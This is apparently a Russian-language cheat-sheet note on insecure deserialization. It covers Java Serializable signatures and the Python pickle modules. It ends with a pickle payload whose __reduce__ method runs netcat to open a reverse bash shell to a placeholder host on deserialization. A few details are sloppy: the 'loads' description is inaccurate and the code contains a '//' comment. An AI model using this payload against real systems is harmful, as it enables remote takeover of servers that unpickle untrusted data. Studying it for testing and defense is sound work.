## Java:  
Для сериализации/десериализации в Java используется интерфейс класса Java.io.Serializable. Для сериализации объекта в байты используется класс ObjectOutputStream, метод writeObject() выполняет запись байт в поток. Для десериализации используется класс 
ObjectInputStream, метод readObject() используется для чтения потока байт из потока (чтение объекта из ObjectOutputStream).  

Сериализованные объект может храниться в разных видах хранилищ.  

Для десериализации данных класс должен наследовать интерфейс Serializable.  

Признаки сериализованного объекта:  
```
ac ed 00 05 73 72
rO0AB
```  

## Python:  
Для сериализации и десериализации объектов в Python используются несколько модулей: pickle, cloudpickle, dill.  

**Методы сериализации / десериализации**:  
- dump: записать сериализованный объект в открытый файл.
- load: преобразует поток байт в объект.
- dumps: возвращает сериализованный объект как строку.
- loads: вернуть результат десериализации как строку.

**Pickle payload**:  
```
import pickle
import os

class pwn(object):
  def __reduce__(self):
    comm = "nc <IP>:<PORT> -e /bin/bash "
    return (os.system, (comm,)) // returns as string or tuple this object on deserialization process.
pwn = pickle.dumps(pwn())
```
